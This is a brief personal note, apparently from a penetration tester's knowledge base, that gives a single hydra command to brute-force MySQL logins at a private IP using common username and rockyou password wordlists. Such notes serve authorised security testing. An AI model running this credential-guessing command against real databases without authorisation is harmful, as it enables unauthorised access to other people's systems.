# hydra brute force MYSQL
Change MYDATABASENAME. Default databasename is mysql.
```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15
```

# References
- [20221003150744](/zet/20221003150744/README.md) hydra brute force
- ~/kb/hacking/commands/hydra.md

Tags:
    #assorted
